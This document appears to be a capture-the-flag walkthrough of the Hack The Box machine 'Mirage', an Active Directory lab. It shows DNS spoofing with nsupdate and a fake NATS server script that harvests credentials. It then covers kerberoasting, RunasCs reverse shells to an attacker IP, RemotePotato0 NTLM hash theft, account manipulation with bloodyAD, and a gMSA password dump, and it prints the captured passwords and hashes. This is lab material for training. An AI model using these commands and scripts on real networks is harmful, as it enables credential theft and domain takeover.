---
tags:
  - Windows
  - Active_Directory
  - HTB
  - nsupdate
  - DNS
  - mount
  - qwinsta
---

we will start with nmap:
```
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-11-14 00:27:10Z)
111/tcp  open  rpcbind       syn-ack ttl 127 2-4 (RPC #100000)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Issuer: commonName=mirage-DC01-CA/domainComponent=mirage
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Issuer: commonName=mirage-DC01-CA/domainComponent=mirage
2049/tcp open  nlockmgr      syn-ack ttl 127 1-4 (RPC #100021)
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Issuer: commonName=mirage-DC01-CA/domainComponent=mirage
4222/tcp  open  vrml-multi-use? syn-ack ttl 127
| fingerprint-strings:
|   GenericLines:
|     INFO {"server_id":"NBB6ZO5JECQPLQ464C6L4R7LEV2LDLMEOXEHA6C6AD4UU32GHO2G6YDF","server_name":"NBB6ZO5JECQPLQ464C6L4R7LEV2LDLMEOXEHA6C6AD4UU32GHO2G6YDF","version":"2.11.3","proto":1,"git_commit":"a82cfda","go":"go1.24.2","host":"0.0.0.0","port":4222,"headers":true,"auth_required":true,"max_payload":1048576,"jetstream":true,"client_id":267,"client_ip":"10.10.17.65","xkey":"XAZSS4ALBUUFD2LMRMWBNFZNVZHJHJXSECSR3ZWIJJH3WTPZGMGWNC37"}
|     -ERR 'Authorization Violation'
5985/tcp  open  http            syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf          syn-ack ttl 127 .NET Message Framing
47001/tcp open  http            syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
59583/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
59594/tcp open  ncacn_http      syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
59596/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
59609/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
59612/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
59632/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
59650/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
61614/tcp open  msrpc           syn-ack ttl 127 Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4222-TCP:V=7.94SVN%I=7%D=11/14%Time=69166B92%P=x86_64-pc-linux-gnu%
SF:r(NULL,1D0,"INFO\x20{\"server_id\":\"NBB6ZO5JECQPLQ464C6L4R7LEV2LDLMEOX
SF:EHA6C6AD4UU32GHO2G6YDF\",\"server_name\":\"NBB6ZO5JECQPLQ464C6L4R7LEV2L
```

We have 2 interesting ports which are `4222` --> nats, `2049` --> nfs share.

mount the port `2049`.
```sh

sudo mount -t nfs 10.10.11.78:/MirageReports /home/slom/HTB/windows/hard/Mirage/mnt -o nolock,vers=3
```

We found two pdfs, first one talks about there is DNS record is missing `nats-svc.mirage.htb` other applications tries to use it but because of holiday the DNS has flush the record. We can use this DNS spoofing to trick other applications to connect to us. The other pdf talks about using kerberose instead of NTLM.
```sh
nsupdate
> server 10.10.11.78
> zone mirage.htb
> update add nats-svc.mirage.htb 60 A 10.10.17.65
> send
```

I have used this script as nats server, which handle connections on port 4222:
```python
import socket
import json

HOST = '0.0.0.0'
PORT = 4222

# Fake INFO response to send to client (based on your earlier nc output)
INFO = {
    "server_id": "FAKE_SERVER_ID",
    "server_name": "FAKE_SERVER",
    "version": "2.11.3",
    "proto": 1,
    "git_commit": "fake",
    "go": "go1.24.2",
    "host": "0.0.0.0",
    "port": 4222,
    "headers": True,
    "auth_required": True,
    "max_payload": 1048576,
    "jetstream": True
}

def handle_connection(client, addr):
    print(f"Connection from {addr}")
    
    # Send INFO to prompt client CONNECT
    info_str = f"INFO {json.dumps(INFO)}\r\n"
    client.send(info_str.encode())
    
    data = b''
    while True:
        try:
            chunk = client.recv(1024)
            if not chunk:
                break
            data += chunk
            
            # Look for CONNECT line
            if b'\r\n' in data:
                lines = data.split(b'\r\n')
                for line in lines:
                    if line.startswith(b'CONNECT '):
                        try:
                            connect_data = line[8:].decode().strip()  # Skip 'CONNECT '
                            connect_json = json.loads(connect_data)
                            print("Captured CONNECT JSON:")
                            print(json.dumps(connect_json, indent=4))
                            
                            # Extract creds if present
                            user = connect_json.get('user')
                            password = connect_json.get('pass')
                            token = connect_json.get('auth_token')
                            if user and password:
                                print(f"\nCaptured Credentials:\nUser: {user}\nPassword: {password}")
                            elif token:
                                print(f"\nCaptured Token: {token}")
                            else:
                                print("\nNo user/pass or token found in CONNECT.")
                            
                            # Send +OK to acknowledge (optional, but keeps connection alive)
                            client.send(b'+OK\r\n')
                        except json.JSONDecodeError:
                            print("Failed to parse CONNECT JSON.")
                        except Exception as e:
                            print(f"Error: {e}")
                
                data = b''  # Reset for next lines
        except Exception as e:
            print(f"Connection error: {e}")
            break
    
    client.close()

# Set up server
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"Listening on {HOST}:{PORT}")
    
    while True:
        client, addr = server.accept()
        handle_connection(client, addr)
```

And i was able to get credentials
```
Captured CONNECT JSON:
{
    "verbose": false,
    "pedantic": false,
    "user": "Dev_Account_A",
    "pass": "hx5h7F5554fP@1337!",
    "tls_required": false,
    "name": "NATS CLI Version 0.2.2",
    "lang": "go",
    "version": "1.41.1",
    "protocol": 1,
    "echo": true,
    "headers": true,
    "no_responders": true
}

Captured Credentials:
User: Dev_Account_A
Password: hx5h7F5554fP@1337!
Connection from ('10.10.11.78', 55572)
```

using those credentials to the original nats server on the DC.
```sh
> server 10.10.11.78
> zone mirage.htb
> update add nats-svc.mirage.htb 60 A 10.10.11.78
> send

nats -s nats://nats-svc.mirage.htb:4222 stream view auth_logs --user "$USER" --password "$PASSWORD"
[5] Subject: logs.auth Received: 2025-05-05 10:19:27
{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}
```

now we can use this creds for bloodhound, but found nothing, so we did kerberosting. And found a kerbrosable account and we were able to crack its password.
```sh
nxc ldap "$IP" -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -k --kerberoasting kerb.txt

bb5M0k5XWIGD
tvPFGAzdsJfHzbRJ
```

`nathan.aadam` : `3edc#EDC3`

---

After alot of enumeration, after looking at `get-process`, we found some user that has session on the box, which we can validate by looking at `explorer`.
```powershell
get-process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    207       8     5776      10684              3732   0 AggregatorHost
    398      33    12568      21860              2952   0 certsrv
    156       9     1900       6452              2796   0 dfssvc
    280      15     3920      15048              3980   0 dllhost
  10408    7490   129864     129388              3012   0 dns
    750      36    24584      54536               368   1 dwm
   1601      63    27040      92344              5664   1 explorer
```

 I thought of using `qwinsta` but in order to use it we should trick windows to think we are in local connection and that can happen using RunasCs.exe:
```powershell
evil-winrm-py PS C:\Users\nathan.aadam> qwinsta
No session exists for *

evil-winrm-py PS C:\Users\nathan.aadam> .\RunasCs.exe nathan.aadam '3edc#EDC3' powershell -r 10.10.17.65:4444

PS C:\Windows\system32> qwinsta
qwinsta
 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
>services                                    0  Disc
 console           mark.bbond                1  Active
```

Now we are sure we can steal his hash using remotePotato:
```sh
sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.78:9999
```

```powershell
evil-winrm-py PS C:\Users\nathan.aadam> .\RemotePotato0.exe -m 2 -s 1 -x 10.10.17.65 -p 9999
NTLMv2 Client   : DC01
NTLMv2 Username : MIRAGE\mark.bbond
NTLMv2 Hash     : mark.bbond::MIRAGE:69ed75d00eb65396:d4be684adcac11d714123e8afc54cec4:0101000000000000de512293e555dc01c9f2f424e5badd0a0000000002000c004d0049005200410047004500010008004400430030003100040014006d00690072006100670065002e0068007400620003001e0064006300300031002e006d00690072006100670065002e00680074006200050014006d00690072006100670065002e0068007400620007000800de512293e555dc0106000400060000000800300030000000000000000100000000200000be92eb907855c7f11cf1f8e4a9f2ddad1a8d6b70dbcde8688740b3e1bf930af60a00100000000000000000000000000000000000090000000000000000000000
```

 `mark.bbond` : `1day@atime`

![[Z Assets/Images/Pasted image 20251115072800.jpeg]]

User `mark.bbond` has `forceChangePassword`on `javier.mmarshall`and write on him, but `javier.mmarshall` is **disabled** and has logon time, which he is enable to login to the system inside specific time intervel. But becasue we have write on him, we can change this.

```sh
# Mark
bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" -p "$PASSWORD" --dc-ip "$IP" remove uac 'javier.mmarshall' -f ACCOUNTDISABLE
bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" -p "$PASSWORD" --dc-ip "$IP" set password 'javier.mmarshall' '1day@atime'
```

```powershell
# Error
evil-winrm-py PS C:\Users\nathan.aadam> .\RunasCs.exe javier.mmarshall '1day@atime' powershell -r 10.10.17.65:4444
[-] RunasCsException: LogonUser failed with error code: Your account has time restrictions that keep you from signing in right now

# Run as Mark so we can manipulate javier.mmarshall attributes
evil-winrm-py PS C:\Users\nathan.aadam> .\RunasCs.exe mark.bbond '1day@atime' powershell -r 10.10.17.65:4444

# As Mark
PS C:\Windows\system32> $bytes = [byte[]](255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255)
PS C:\Windows\system32> Set-ADUser -Identity javier.mmarshall -Replace @{logonHours = $bytes}
```

```sh
# javier.mmarshall
getTGT.py -dc-ip "$IP" "$DOMAIN"/"$USER":"$PASSWORD"
gMSADumper.py  -d "$DOMAIN" -k
Users or groups who can read password for Mirage-Service$:
 > javier.mmarshall
Mirage-Service$:::738eeff47da231dec805583638b8a91f
Mirage-Service$:aes256-cts-hmac-sha1-96:7c7cf51a944c05f934f055683959f1aa12230cbc42072cff8def34442c0fad8b
Mirage-Service$:aes128-cts-hmac-sha1-96:a21199c62fd336f19f6fbf167ae3fced
```

`Mirage-Service$` : `738eeff47da231dec805583638b8a91f`
